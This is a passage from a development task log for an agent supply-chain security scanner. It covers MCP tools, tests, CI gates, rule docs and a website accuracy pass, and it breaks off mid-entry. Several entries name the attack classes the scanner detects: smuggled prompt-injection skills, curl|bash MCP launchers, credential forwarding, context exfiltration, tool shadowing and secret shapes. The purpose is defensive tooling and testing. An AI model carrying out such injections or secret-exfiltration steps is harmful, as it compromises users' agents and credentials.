28. [x] **`shellockolm doctor`** — environment self-check that verifies the install can scan before you depend on it. Probes the **Python runtime** floor (`>=3.10`, from `requires-python`), that the bundled **CVE database** (`get_all_vulnerabilities`) and the **agent supply-chain rule catalog** (`agent_rule_catalog`) import and are populated (the honest "db freshness" signal for a bundled-data scanner — counts, not a fabricated feed date), that the **config** (`~/.shellockolm`, where the Pro license is stored) and **session/log** dirs are writable (a real write+delete probe, cleaned up), that **`git`** (needed by `scan --diff` / the pre-commit hook) is on `PATH`, and the active **license** tier. Each check is `ok`/`warn`/`fail`/`info` with an actionable hint; only a hard **fail** (old Python, corrupt install) exits non-zero — a missing `git` or unwritable log dir is a `warn` that still passes. Exit codes mirror the scan contract (**0** healthy / **1** a check failed); `--json` emits one stable `schema_version` 1.0 document (pure stdout, no banner) for CI. Runs **fully offline** unless a license key is configured (the license probe is the only network-capable check and `LicenseManager` only calls out when a key is present). Pure, testable `src/doctor.py` (mirrors `diff_scan.py`/`baseline.py`); 23 new tests (Python-floor boundary, writable-probe success/failure+cleanup, git/license probes, `DoctorReport` health/counts/serialization, CLI exit-code mapping via monkeypatch, e2e subprocess proving pure-JSON stdout + healthy-machine exit 0), `doctor` added to the smoke-import net, README+CHANGELOG documented. Full suite **508 green** (was 484). _(commit 7e89baa)_
29. [x] **Config file** — supports a committed `shellockolm.toml` (top-level keys OR a `[tool.shellockolm]` table) or a `pyproject.toml` `[tool.shellockolm]` table, discovered as the **nearest** file at or above the scan path (walking up like `.gitignore`); a dedicated `shellockolm.toml` is preferred over a `pyproject`, and a `pyproject` WITHOUT our table is left alone (discovery keeps walking). Keys: `path`, `scanner`, `recursive`, `max_depth` (alias `depth`), `min_confidence`, `fail_on`, and `ignore` (a list of rule/CVE IDs and/or gitignore-style path globs). Config is a **default, never an override** — a value is applied only for a flag the user did NOT pass, detected via Click's parameter source compared by member **name** (Typer bundles its own Click as `typer._click`, so an enum-identity check silently fails and would wrongly override explicit flags — the bug I hit and fixed mid-task). `ignore` is a pure, scanner-agnostic post-filter applied alongside `--diff`/`--baseline` (rule-ID match is case-insensitive; path globs are base-relative + forward-slashed and strip the `:<line>`/`» server:` suffix); the hidden count is announced and surfaced as `summary.findings_config_ignored` in `--json`. `--config <path>` targets a specific file (missing/invalid → exit 2), `--no-config` disables discovery, and a malformed config (bad value/type, invalid TOML) is a usage error (exit 2) — never a silently-wrong scan. **Also fixed a real packaging bug found en route:** `diff_scan`/`baseline`/`doctor` (tasks #19/#25/#28) were imported by `cli` but missing from `py-modules`, so a `pip install` built a package whose `shellockolm` console script fails to import — all three plus `config_file` are now packaged and in the smoke-import net. Pure, testable `src/config_file.py` (mirrors `diff_scan`/`baseline`/`doctor`); 56 new tests (discovery + precedence, table extraction, full validation + every error path, ignore rule-ID/glob matching, anti-drift parity with the CLI's `_FAIL_ON_CHOICES`, e2e subprocess for defaults/override/`--no-config`/ignore/pyproject-discovery/exit-2). Verified live end-to-end. Full suite **567 green** (was 508). _(commit b1d4e64)_
30. [x] **Progress + summary stats** — the per-scanner artifact/unit counts (`skills_scanned`, `mcp_configs_scanned`, `packages_scanned`, `files_scanned`, `instruction_files_scanned`, `commands_scanned`, `claude_settings_scanned`, …) and the scanner count + elapsed time were already tracked on each `ScanResult` but were never surfaced together. A single pure helper `aggregate_scan_stats()` rolls them up — summing every integer stat whose key ends in `_scanned` (so a new scanner that follows the convention is counted with no further changes; bools and the `min_confidence` string are excluded) — and both output paths now surface them consistently: the human `INVESTIGATION SUMMARY` footer shows **Items scanned** + **Scanners run** alongside the existing duration, and the `--json` `summary` block gains additive `items_scanned` / `scanners_run` keys (the documented `schema_version` 1.0 contract only ever grows). README JSON schema + CHANGELOG documented. 10 new tests (`tests/test_scan_stats.py`: `_scanned`-suffix summation across results, scanner count, duration rounding, non-count-stat exclusion incl. bool/string/finding-tally, empty-results zero case, JSON propagation parity with the helper, e2e human-footer + `--json` real-volume over a 3-skill benign fixture) + updated the json-report summary key-set assertion; full suite **577 green** (was 567). _(commit adbab53)_

## Tier 3 — MCP server tooling (agent-native distribution)

31. [x] **MCP tool: `scan_agent_artifacts`** — exposes the agent supply-chain scanner directly through the MCP server as a dedicated tool (the 9th), so an agent can vet a skill / MCP server / repo mid-session BEFORE trusting it. Args: `path` (required) + `recursive`/`max_depth`/`min_confidence` (`low|medium|high`)/`quick_mode`; runs ONLY the agent scanner with Pro rules gated by the active license exactly as on the CLI (free tier still returns every free finding). A pure `build_agent_scan_payload()` assembles a stable `schema_version` 1.0 document mirroring `scan --json`, ADDING per-finding `attack_class` (prompt-injection/mcp/n8n/hooks/secrets/…) + `tier` (free/pro); findings sorted CRITICAL→INFO and the JSON is `ensure_ascii` so an invisible-Unicode injection payload stays pipe-safe. `format_agent_scan_results()` renders a markdown summary + an embedded JSON block. Boundary-validated: a missing path, an invalid `min_confidence`, or a non-integer `max_depth` is a clear error, never a silently-wrong scan. Covers every agent artifact class the CLI does (SKILL.md, mcp.json, n8n exports, slash commands, settings.json hooks, CLAUDE.md/AGENTS.md/.cursorrules). Verified ZERO FP on a benign skill and positive detection of AGENT-PI-007 (smuggled skill) + AGENT-MCP-005 (raw-URL MCP config); 16 new tests (`tests/test_mcp_agent_scan.py`: payload shape + CRITICAL→INFO ordering + zero-FP baseline + ASCII-safety, formatter, tool registration, e2e handler runs incl. single-file path + every error path) and the live stdio check (`tests/mcp_live_check.py`) now exercises it end-to-end through the real MCP transport (PASS). Full suite **593 green** (was 577). _(commit 359a43a)_
32. [x] **MCP tool: `explain_finding`** — exposes the per-finding explainer through the MCP server as a dedicated tool (the 10th), the companion to `scan_agent_artifacts`. Given a rule ID (`AGENT-*`, from an agent-artifact scan) OR a tracked CVE ID (`CVE-*`, from a dependency/malware scan), `build_explain_payload()` returns a stable `schema_version` 1.0 document with the rule/CVE's severity, tier, confidence, attack class, CVSS, full description, a concrete **example attack**, and the remediation. Single entry point for BOTH finding families the scanner emits: agent rules resolve through the shared `agent_rule_explain` catalog (no drift vs the `rules explain` CLI), CVEs through the bundled vulnerability database. Lookup is case-insensitive + whitespace-tolerant; a missing/blank id and an unknown id are clear errors (never a silently-empty explainer); `format_explain_payload()` renders a markdown why/impact/remediation write-up + an `ensure_ascii` JSON block so unicode-heavy rule prose stays pipe-safe. Verified end-to-end over the real stdio transport (`tests/mcp_live_check.py` now resolves both a rule and a CVE — PASS) and with 21 new tests (`tests/test_mcp_explain_finding.py`: resolver shape for rules + CVEs, case-insensitivity, every-rule-resolves coverage, unknown/boundary→None, the markdown/JSON formatter, ASCII-safety, tool registration, and e2e handler runs incl. every error path). README + CHANGELOG documented. Full suite **614 green** (was 593). _(commit 6c1646f)_
33. [x] **MCP tool: `scan_text`** — scans a raw artifact STRING in-memory with **no disk I/O** — the sibling of `scan_agent_artifacts` for content an agent is *about to install or paste*. New `AgentSupplyChainScanner.scan_text(text, artifact_type=…, filename=…, min_confidence=…)` routes the string to the right detection path: `artifact_type` selects it explicitly (`skill`/`instructions`/`command`/`mcp`/`n8n`/`settings`); the default `auto` infers it from an optional `filename` hint (same name rules as the directory walk), then from the content shape (valid JSON with `mcpServers`/`servers` → mcp, `nodes`+`connections` → n8n, `hooks` → settings, otherwise prose → **skill**, the broadest full-rule path). A synthetic per-kind virtual name (or the caller's `filename`) is the finding `file_path` locator; bytes input is accepted (BOM-aware decode). Composite-severity boosting and the `min_confidence` filter run exactly as in `scan_directory`; rule-ID `.shellockolmignore` suppression is deliberately skipped (no on-disk ignore tree for a string) and a per-kind `*_scanned`=1 stat keeps the MCP items-scanned aggregation correct. The MCP tool (the 11th) validates the one required `text` field + `artifact_type`/`min_confidence`/`filename` at the boundary (clear errors, never a silently-wrong scan), reuses the flagship `build_agent_scan_payload` so `scan_text` and `scan_agent_artifacts` share one `schema_version` 1.0 contract, and adds an additive `scan.artifact_type` surfacing what `auto` resolved to. Verified ZERO FP on a benign skill, positive detection of AGENT-PI-007 (smuggled skill, incl. via `auto` and the command path), AGENT-MCP-005 (raw-URL mcp.json auto-detected by content + filename), and AGENT-HOOK-001 (settings hooks), and the no-disk-I/O guarantee; the live stdio check (`tests/mcp_live_check.py`) now exercises it end-to-end (PASS). 24 new tests (`tests/test_mcp_scan_text.py`); full suite **638 green** (was 614). _(commit cf2afb4)_
34. [x] **MCP server self-test** — promotes the manual `tests/mcp_live_check.py` script to a real pytest (`tests/test_mcp_server_selftest.py`) that launches `src/mcp_server.py` as a **subprocess** and drives it through the genuine MCP JSON-RPC **stdio** transport exactly as an AI client (Claude Code/Desktop/Cursor/Windsurf) would: `initialize` → `list_tools` → `call_tool` for **all 11 tools** → `list_resources`/`read_resource`. Closes the gap the in-process MCP tests left — they call `handle_call_tool` directly, so the full client⇆server handshake was never CI-covered. **Offline by construction**: each scanning tool runs against a tiny **local** temp fixture (a vulnerable `package.json` + a malicious/benign `SKILL.md`), and `scan_live` is probed with a `127.0.0.1` loopback URL the SSRF guard rejects *before* any socket opens. The server is spawned **once** (a module-scoped fixture captures every response, then 18 granular per-tool tests assert on it): the exact 11-tool surface + object input-schemas, CVE detection (`quick_scan`→CVE-2024-21508 via the npm scanner, `scan_directory`→CVE-2025-29927 via the nextjs scanner — both scanner-pinned so the result is deterministic and fixture-scoped, never the host's well-known paths), `scan_agent_artifacts` smuggled-payload detection + a zero-finding benign baseline, in-memory `scan_text`, `explain_finding` resolving BOTH a rule id and a CVE id, the SSRF loopback block, and the `cve://` resource list+read. **Surfaced and fixed a real latent bug:** `handle_read_resource` was typed `uri: str` and called string-only methods, but the MCP framework passes a pydantic `AnyUrl` over the real transport, so every transport-level `cve://` read errored with `'AnyUrl' object has no attribute 'startswith'` (the in-process `get_cve_info` path was unaffected) — now coerced to `str` up front. Full suite **656 green** (was 638). _(commit c52e489)_
35. [x] **MCP install docs** — one-paste MCP server block for Claude Code, Claude Desktop, Cursor, and Windsurf in BOTH the README (new "Add Shellockolm to your AI agent" section) and the marketing site (new InstallSection "Step 3 — Add to Your AI Agent (MCP)" with a copyable `mcpServers` block + per-client grid). All clients share ONE block (`{"command":"shellockolm-mcp"}`), backed by the real `shellockolm-mcp` console script (`mcp_server:run` in pyproject) and the shipped `claude_desktop_config_EXAMPLE.json`. Fixed stale website install commands (`cd shellockolm`/`pip install -r requirements.txt` → repo dir + `pip install -e .`; legacy `python src/server.py` → `shellockolm-mcp`). Accuracy pass on docs/MCP_SETUP.md: corrected the tool reference to the real **11** tools (removed nonexistent `fix_vulnerability`/`check_cve`, led with the agent supply-chain tools), removed the fabricated startup banner ("v2.0 / Listening on stdio…" — the stdio server prints nothing) in favor of `shellockolm doctor` + `claude mcp list`, and dropped the stale `cwd` guidance. Verified `npm run build` green (1591 modules) + dev-preview DOM render with no console errors; every claim grounded against the code. _(commit ec7eeb2)_
36. [x] **MCP tool: `check_mcp_config`** — the 12th MCP tool audits the agent's OWN installed MCP setup by scanning the well-known config locations per OS: Claude Desktop (`%APPDATA%\Claude` / `~/Library/Application Support/Claude` / `~/.config/Claude`), Claude Code (`~/.claude.json`), Cursor (`~/.cursor/mcp.json`), Windsurf (`~/.codeium/windsurf/mcp_config.json`), VS Code (`…/Code/User/mcp.json`), plus this project's `.mcp.json` / `mcp.json` / `.cursor/mcp.json` / `.vscode/mcp.json`. Each existing file is routed through the agent scanner's **structured MCP path regardless of its actual filename**, so a config not literally named `mcp.json` (`~/.claude.json`, Windsurf's `mcp_config.json`) is still parsed for `mcpServers`/`servers` entries and flagged for raw-URL/public-IP launchers (AGENT-MCP-005), broad host creds forwarded to an unrelated server (AGENT-MCP-004), `curl|bash` (AGENT-MCP-001), unpinned remote packages (AGENT-MCP-002), or hardcoded secrets. Reports which configs exist / were scanned + structured findings (reusing the `scan_agent_artifacts` per-finding shape via a shared `_agent_finding_dict` helper) in a stable `schema_version` 1.0 doc. **Read-only** (never modifies a config), bounds each read at 5 MB (oversize → `skipped`, never a silent gap), redacts any matched secret. Candidate-location enumeration lives in a pure, parameterized `src/mcp_config_locations.py` (mirrors the `diff_scan`/`baseline`/`doctor`/`config_file` split — no FS access). Pro rules gated by the active license as on the CLI. Verified live against the real machine's configs (correctly surfaced a CRITICAL secret-in-URL + HIGH hardcoded creds, both redacted). 26 new tests (`tests/test_mcp_check_config.py`: per-OS enumeration incl. APPDATA fallback + de-dup, disk-probing scan incl. absent/oversize/forced-mcp-path, payload contract + CRITICAL→INFO ordering, formatter, registration, every e2e error path) + the live stdio self-test now drives it as the 12th tool; `mcp_config_locations` added to py-modules + smoke-import net. Full suite **684 green** (was 656). _(commit d48f4fa)_
37. [x] **Pro gating in MCP** — locks the open-core monetization invariant across the MCP surface with a regression suite. The agentic MCP tools (`scan_agent_artifacts`, `scan_text`, `check_mcp_config`) construct `AgentSupplyChainScanner()` with **no** `pro=` arg, so Pro gating is decided solely by the active license inside the scanner's `__init__` — identical to the CLI by construction (gating itself lives in one place: `_extra()` returns `PRO_RULES` only when `self.pro`). New `tests/test_mcp_pro_gating.py` drives the **real async `handle_call_tool` entry point** (scanner built internally, never handed an explicit tier) over a single artifact that trips exactly one FREE rule (smuggled `AGENT-PI-007`) and one PRO rule (`AGENT-PRO-003` context-exfil), asserting: free → free finding present + Pro rule absent + `scan.pro=false` + every finding `tier="free"`; Pro → free **plus** Pro rule + `scan.pro=true` + the Pro finding `tier="pro"`; gating is **strictly additive** (free id set ⊂ Pro id set, the delta only ever genuine pro-tier rules — Pro never drops/rewrites a free finding); the MCP path's finding set is **identical** to a directly license-pinned `AgentSupplyChainScanner(pro=…)` at BOTH tiers (the strongest "respected identically" proof); and no free-tier scan across any of the three tools leaks a `tier="pro"` finding. Fully offline + host-license-independent: `licensing.LicenseManager` is replaced with a fake (the scanner re-reads that module attribute on each construction), so neither tier depends on a real license file, env var, or network. 11 new tests; full suite **695 green** (was 684). _(commit 404a0cd)_
38. [x] **MCP rate/size safety** — a hostile or accidental giant input can no longer hang an agent's tool call, via two complementary caps that surface **partial-scan warnings** instead of blocking. **(A) Input size** — `scan_text` (and every in-memory caller) bounds its input at `MAX_TEXT_CHARS` (1,000,000 chars); a larger string is truncated to the cap (the head — frontmatter + the opening injection prose — is still scanned) and the cut is announced, never silent. **(B) Walk time** — `scan_directory` gained an optional `time_budget` (seconds): the walk is now iterated **lazily** (the prior eager `list(self._walk(...))` materialization was itself the hang on a huge tree) and the deadline is checked before each candidate file, so a pathological / looping tree stops at the budget with a partial result rather than blocking. The `scan_agent_artifacts` MCP tool applies a **120 s default** budget (override per-call; `0` = unbounded for a deliberate full local scan); the CLI default stays unbounded (`time_budget=None`) so existing behaviour is byte-identical. A new `ScanResult.warnings` channel — distinct from per-file read `errors` — carries the notices through `to_dict()` and the structured MCP payload (`summary.partial` / `summary.warnings`) and the human-readable tool output (`build_agent_scan_payload` / `format_agent_scan_results`). 19 new tests (`tests/test_mcp_rate_size_safety.py`: truncation + head-still-scanned, the zero-false-partial baseline on a normal input, lazy-walk timeout via a deterministic fake monotonic clock, `time_budget` boundary validation incl. non-numeric → exit-style error and `0` = unbounded, and the `partial`/`warnings` contract end-to-end through both agent MCP tools + the tool schema exposing `time_budget`). Full suite **714 green** (was 695). _(commit f39c083)_

## Tier 4 — Quality, trust, and tests

39. [x] **Fixture corpus** — `tests/fixtures/` tree of real-shaped malicious + benign artifacts (skills, mcp.json variants, n8n exports, CLAUDE.md, slash commands, settings.json) labelled in a machine-readable `manifest.json` (schema_version 1.0) and consumed by a new `tests/test_fixture_corpus.py`. The corpus is the single, self-describing detection regression net the manifest points at: it enforces a per-fixture contract — malicious fixtures must trip every rule ID they declare (subset check, broader detection fine), benign fixtures must produce ZERO findings at BOTH the free and Pro tier, and the manifest stays in sync with the on-disk tree (no undocumented files, every declared fixture present). 18 artifacts across 6 classes (11 malicious covering AGENT-PI-004/008/011/012/013/014/015, MCP-004/005, N8N-002, HOOK-001, EXFIL-002; 7 benign zero-FP baselines incl. the official progressive-disclosure pattern, a matched-service github MCP cred, a first-party n8n POST, and a prettier hook). `.gitignore`'s blanket `fixtures/` rule narrowed (append-only) so this corpus under `tests/` is tracked while ad-hoc local `fixtures/` dirs stay ignored; a README documents the layout and every fixture. Verified live over the whole corpus at both tiers before wiring. 64 new tests; full suite **778 green** (was 714). _(commit fc0ac95)_
40. [x] **False-positive regression suite** — vendors a corpus of real, popular, legitimate agent skills and proves the scanner does not cry wolf on genuine content. `tests/fixtures/legit-corpus/` holds 23 **unmodified** `SKILL.md` files from the official `anthropics/claude-plugins-official` "Internal plugins developed and maintained by Anthropic" directory (Apache-2.0; provenance + attribution in `legit-corpus/PROVENANCE.md`); only the model-facing `SKILL.md` is vendored, so the on-disk corpus equals exactly the artifacts the scanner reads. The contract (scanned at the strictest Pro tier): **zero CRITICAL findings at any confidence** and **zero CRITICAL/HIGH findings at `high` confidence** — i.e. the deterministic structural/signature rules never false-positive on real legit content, and the `--min-confidence high` CI gate is clean on it. It deliberately does NOT require zero findings overall: 18 low/medium-confidence NL-heuristic HIGHs (13× `AGENT-PI-002` firing on the legit `description:` frontmatter line — *"Use when the user asks to…"* — plus `AGENT-PRO-001/002`, `AGENT-PI-006`, `AGENT-DESTRUCT-001`) legitimately match some real skills, which is exactly what the `confidence` axis + the high-confidence gate exist to filter; tightening those is tracked as separate calibration work (the PI-002-on-frontmatter case is a concrete follow-up). 53 new tests (corpus hygiene incl. a non-vacuous size floor + an "actually scanned" guard, whole-corpus CRITICAL/high-confidence gates at BOTH Pro and free tiers, the end-to-end `--min-confidence high` gate, and per-file pinpointing so a regression names the exact offending skill). Narrowed the fixture-corpus orphan check to exclude this separate sibling corpus. Full suite **831 green** (was 778). _(commit 8ed1cfb)_
41. [x] **Coverage gate** — a non-regression line-coverage floor over `src/`, enforced by a dedicated **build-blocking** `coverage` job in CI (`pytest tests/ --cov=src --cov-report=term-missing --cov-report=xml`, no `continue-on-error`). The threshold lives in exactly ONE place — `[tool.coverage.report] fail_under` in `pyproject.toml` (pytest-cov reads it, so CI and local `pytest --cov=src` enforce the identical floor with no duplicated number). Current measured coverage is **30.2%** (838 tests); the floor **starts at 28%** — a small cushion below the measured value because a few tests are Windows-only and skip on the Linux coverage job — and is ratcheted **up** as coverage grows, never down. `[tool.coverage.run]` scopes to `src` and `exclude_lines` drops untestable guard lines (`__main__`/`TYPE_CHECKING`/`abstractmethod`) from the denominator; coverage is deliberately kept OUT of the default pytest `addopts` so the suite still runs with pytest-cov absent. New `tests/test_coverage_gate.py` (7 tests, stdlib-only file parsing so it collects on every supported Python) asserts the wiring can't silently rot: `fail_under` declared + not gutted below the floor, `[tool.coverage.run]` targets `src`, CI runs `--cov=src` in a step that can fail the build, and pytest-cov genuinely enforces `fail_under` here (an isolated subprocess on an unreachable 100% floor exits non-zero). **Also fixed a latent CI-collection bug:** the existing workflow contract tests (`test_github_action.py`, `test_pre_commit_hooks.py`) `import yaml` unguarded, but PyYAML was never a declared dependency — a clean `pip install .[dev]` could not collect the suite — so `pyyaml>=6.0` was added to the `dev` extras. Verified: full gate run exits 0 at "Required test coverage of 28.0% reached. Total coverage: 30.22%"; full suite **838 green** (was 831). _(commit ca065ee)_
42. [x] **CI workflow** — `.github/workflows/ci.yml` now runs tests across Python **3.10, 3.11, 3.12, 3.13, 3.14** on the ubuntu + windows matrix (was 3.10/3.12), and a dedicated **build-blocking `lint` job runs `ruff check src`** (replacing the prior non-blocking flake8 + black steps). The lint rule selection + deferred-backlog `ignore` list is the single source of truth in `[tool.ruff.lint]` (pyproject.toml), shared by CI and a local `ruff check src`: it enforces the E/F/W correctness families clean while the genuine-bug codes (undefined name F821/F823, redefinition F811, syntax E9) stay un-ignored and a pre-existing cosmetic backlog (E501/whitespace/F541/F401/deferred-imports) is deferred and ratcheted down — never up (mirrors the task #41 coverage-floor philosophy). `ruff>=0.6.0` added to dev extras + 3.13/3.14 classifiers. **On first run the gate surfaced and I fixed three real `cli.py` crashes:** `re`/`Panel`/the `scanners` command were each shadowed by a redundant local re-import/assignment later in the same interactive-menu scope (UnboundLocalError on that path), plus a missing `Dict` typing import (NameError under `get_type_hints()`). Verified `ruff check src` exits 0 under the committed config; 9 new contract tests (`tests/test_ci_workflow.py`: matrix coverage, blocking ruff job, single-source config, enforced bug codes un-ignored, requires-python floor == lowest matrix Python, live mechanism tests that the repo passes its own gate + ruff flags a synthetic F821). Full suite **847 green** (was 838). _(commit b46e39e)_
43. [x] **Self-scan in CI** — a dedicated, **build-blocking** `self-scan` job in `.github/workflows/ci.yml` runs shellockolm's flagship agent supply-chain scanner against its OWN repo on every CI run and fails on any HIGH/CRITICAL finding in a real agent artifact (`scan -s agent --fail-on high .`, JSON+SARIF uploaded as an artifact). The "fail on **new** HIGH+" goal is met the strongest possible way: the repo is genuinely **clean** at HIGH+ today, so the gate uses a plain `--fail-on high` (every HIGH+ is new) rather than a baseline. A committed `shellockolm.toml` excludes ONLY the deliberate detection corpus under `tests/fixtures/` (intentionally malicious/benign test data the detection suite asserts on — NOT a real threat) and sets ONLY `ignore` (no `scanner`/`fail_on`), so a contributor's plain `shellockolm scan .` is never silently narrowed; the excluded count is always announced. Agent-only keeps the gate deterministic + fully offline (bundled rules, no live CVE feed) so a red build always means a genuine regression — the honest basis for the dogfooding claim ("only claim it once true"). **Verified live**: with the config a self-scan reports zero HIGH+ across the repo's real artifacts (42 agent items scanned, 36 fixture findings correctly excluded) → exit 0; without it (`--no-config`) the fixtures trip HIGH+ → exit 1, proving the exclusion is load-bearing and the gate has teeth. 9 new tests (`tests/test_self_scan.py`: job wiring incl. agent scanner + build-blocking + `--fail-on high` ∈ the CLI's `_FAIL_ON_CHOICES`, the config excludes the fixtures without pinning `scanner`/`fail_on`, and the mechanism proof — clean-at-HIGH+-today with a non-vacuous items_scanned/findings_config_ignored guard AND the load-bearing-exclusion / gate-has-teeth pair). Honest-claim discipline: README documents the self-scan in prose (no status badge until the workflow actually runs on `main`). Full suite **856 green** (was 847). _(commit 10f9f12)_
44. [x] **Property tests for redaction** — promotes the fixed-example redaction tests into a **Hypothesis property**: for ANY structurally-valid credential of every supported shape (AWS `AKIA`, GitHub `ghp_`, Slack `xox*`, OpenAI `sk-`, Google `AIza`, Stripe `sk/rk_live_`, Telegram bot, Discord bot, and a decoded Supabase **service_role** JWT — strategies built from the exact rule character-classes so every example matches its detector), embedded in **every artifact class the scanner reads** (skill prose, `CLAUDE.md` instruction file, MCP `env` value, n8n direct-embed node), the raw secret appears **nowhere** in the serialized finding output — the canonical `result.to_dict()` JSON that every downstream report (human / `--json` / SARIF) derives from, plus each per-finding `description`/`title`/`remediation`/`file_path`/`raw_data` field — only the masked `<4-char type prefix>…[redacted, N chars]` form, with the `[redacted` marker asserted present. This exercises **all four** `_mask_secret`/`_check_jwt_secrets` call sites (prose `_apply_rules`, MCP-structured, n8n condition-B embed, JWT), not just one. Adds a fast FS-free foundational property directly on the `_mask_secret` primitive (arbitrary >8-char text — including whitespace-collapsed input — is never echoed verbatim and only a ≤4-char prefix survives), and the suite was **mutation-verified to have teeth** (patching `_mask_secret` to echo the value makes the property fail). `hypothesis>=6.0` added to the dev extras; the module `pytest.importorskip`-guards it so a minimal non-dev install still collects the suite, and `.hypothesis/` is already gitignored. No `src/` change → the `ruff check src` lint gate is untouched. Full suite **863 green** (was 856). _(commit c0adc78)_
45. [x] **Type-check pass** — mypy now runs **clean at strict settings** (`disallow_untyped_defs`, `warn_return_any`) on the detection-critical core (`src/scanners` + `src/licensing.py`), enforced by a dedicated **build-blocking** `typecheck` job in `.github/workflows/ci.yml` (`run: mypy`). Scope, import resolution, and strictness are the single source of truth in `[tool.mypy]` in `pyproject.toml` — `mypy_path = "src"` resolves the project's flat imports from the repo root, `files` scopes the gate to the core (a **ratchet**, widened over time never narrowed), `follow_imports = "silent"` keeps it scoped — so CI and a local bare `mypy` enforce the identical gate. Getting to clean fixed **65 real type errors** with genuine fixes (no blanket `# type: ignore`): widened `create_finding(file_path=)` to `str | Path` (it already `str()`-converts internally); annotated the per-scanner vulnerability tables (`PACKAGE_VULNERABILITIES`/`COMPROMISED_PACKAGES`/`VULNS`) so their entries stop typing as `object`; **restored the `quick_mode` parameter on three subclass `scan_directory` overrides that had dropped it** (a real LSP/override break the gate surfaced); widened `ScanResult.stats` to the free-form `Dict[str, Any]` it actually is (string metadata like `min_confidence` alongside int counts); `parse_package_json` now returns `None` for a non-object top-level JSON; rewrote an `object`-typed dedup that used `set.add()`'s return value in a comprehension; typed `SCANNER_REGISTRY` as factory callables so instantiating the concrete subclasses doesn't trip the abstract-base check. Behaviour unchanged (full suite green before and after). 7 new contract tests (`tests/test_type_check.py`, stdlib-only config/workflow parsing so it collects on every supported Python): mypy is a dev dep, the core scope + `mypy_path` + strictness flags are present, the `typecheck` job is build-blocking, and — the real proof — the committed core passes its own gate **and** the gate has teeth (an int/str return mismatch fails under the repo config). Full suite **870 green** (was 863). _(commit 560efff)_

## Tier 5 — Docs & revenue-readiness (no fabricated claims)

46. [x] **RULES.md** — the agent supply-chain rule reference is now a committed, browsable `RULES.md` at the repo root, **generated** from the single source of truth (`scanners.agent_supply_chain.agent_rule_catalog()` + `agent_rule_example()` — the same data behind `rules list` / `rules explain`) by `scripts/generate_rules_md.py`, so the doc can never drift from the code. The render is fully deterministic (no timestamps/randomness; rules in stable id order; LF-forced) and byte-stable, so `generate_rules_md.py --check` doubles as a CI drift gate (exit 1 on mismatch). The doc carries an index table (id → anchor, severity, tier, confidence, attack class, one-line title) over all 38 rules (35 free / 3 Pro) plus per-rule detail sections grouped by attack class — each with the full description, a fenced **example attack**, CVSS, and remediation. Linked from the README rule-reference section and the marketing-site footer ("Rule Reference" → `RULES.md`). 13 new tests (`tests/test_rules_md.py`: committed file byte-identical to a fresh render, deterministic render, `--check` has teeth via a perturbation, every catalog rule has an index row + detail section + example, header counts match, Pro rules labelled, README + Footer link present, balanced fences, `--stdout` writes nothing). Full suite **883 green** (was 870); website `npm run build` green. _(commit e56a8bf)_
47. [x] **Threat-model doc** — `THREAT_MODEL.md`, a committed one-page agentic supply-chain threat model, shipped the same drift-proof way as `RULES.md` (#46): a new `scripts/generate_threat_model.py` renders it from the single source of truth (`agent_rule_catalog()`), so the **rule↔attack-class coverage can never over-state what the scanner ships**. The page frames the **trust boundary** an agent crosses when it auto-loads each artifact class (skills / MCP configs / instruction files / `.claude` hooks / slash commands / n8n exports — with what the agent does with each and why it's a boundary), enumerates the **attacker's goals**, then maps **exactly which rule covers which attack class**: a generated coverage-at-a-glance matrix (per-class rule/free/Pro counts + severities) plus a per-class section pairing a hand-authored _Threat_/_Impact_ narrative with a generated table of its rules (each rule id deep-linking to its `RULES.md` anchor). Closes with a **Scope and honest limitations** section (static shape-detector not a sandbox; a clean scan is not a safety guarantee; NL heuristics are confidence-graded; **Pro is strictly additive**; the catalog is the contract) — the "maps to marketing honestly" requirement. Render is deterministic/LF-forced so `--check` is a CI drift gate; the conceptual `_THREAT_CLASSES` narrative is **test-enforced to exactly equal the catalog's attack-class set**, so a new rule family can't ship undocumented. Linked from the README rule-reference section and the marketing-site footer. Verified: `--check` in sync, the live self-scan stays clean at HIGH+ with the new doc present (not classified as an agent artifact), website `npm run build` green (1591 modules). 17 new tests (`tests/test_threat_model.py`: byte-identical in-sync gate + teeth, class↔catalog parity, every-rule-mapped, matrix-count correctness, Pro labelling, scope-section presence, README+Footer links, `--stdout` no-write); full suite **900 green** (was 883). _(commit 993e693)_
48. [x] **Pro tier page accuracy pass** — audited the website Pro feature list (`website/src/components/ProTierSection.tsx`) against what the product actually ships. Ground truth: the ONLY implemented Pro capability is the additive 3-rule detection pack (`AGENT-PRO-001` indirect/second-order prompt injection, `AGENT-PRO-002` tool/skill shadowing, `AGENT-PRO-003` conversation-context exfiltration), gated by `_extra()`→`PRO_RULES` under the server-validated license. The page also presented **Premium report formats** (Executive PDF / Jira-Linear export), **Continuous monitoring** (scheduled server scans + inbox alerts), and **Early access** as live deliverables — but grep across `src/` confirmed NO PDF generator, NO Jira/Linear export, and NO monitoring/scheduler/email feature exists (only `src/licensing.py`'s aspirational docstring mentions them). Honest fix (no features removed from the free OSS): kept the genuinely-shipped items first and made the rule-pack detail accurate (names the 3 real rule IDs); the three unshipped items are now rendered with a distinct muted **"Roadmap"** badge (new `status:"roadmap"` field + `Clock`-icon `FeatureRow` variant) so the page never sells an unbuilt feature as available; softened the "what Pro adds" callout from "server-delivered features" to "additive, license-gated detection rule packs … with premium reports and continuous monitoring on the roadmap". `PricingSection.tsx` (human-delivered audit/retainer services) reviewed and left as-is — honest descriptions of manual work, not software-feature claims. Verified `npm run build` green (1591 modules) + live dev-preview DOM render (3 shipped + 3 ROADMAP-badged rows, zero console errors). _(commit 6319e92)_
49. [x] **Quickstart GIF/asciinema + 60-second README path** — shipped a verified `install → scan → finding` path that produces a **real** finding instead of a placeholder. New `examples/vulnerable-demo/` (a Next.js `package.json` pinned to `next@15.2.2`) is deterministically flagged as **CVE-2025-29927** (middleware auth bypass, CVSS 9.1) so `shellockolm scan examples/vulnerable-demo` exits 1 with a real finding; the demo is **not** an agent artifact so the agent-only self-scan CI gate stays SECURE (42 items, 0 HIGH+). README + `docs/QUICKSTART.md` were rewritten to the installed `shellockolm` console script (were `python src/cli.py`) and the 3-command path (`pip install -e .` → `scan examples/vulnerable-demo` → `info CVE-2025-29927`), and QUICKSTART's **fabricated** example output — which invented "3 vulnerabilities" and mislabelled the CVE as *HIGH* when the tool reports it *CRITICAL/9.1* — was replaced with the real finding text (the "See It In Action" one-liners were corrected to the console script too). A valid **asciinema v2** recording (`docs/quickstart.cast`) is generated drift-proof by `scripts/generate_quickstart_cast.py` with a `--check` CI gate (mirrors the RULES.md/THREAT_MODEL.md pattern). 14 new tests (`tests/test_quickstart.py`: 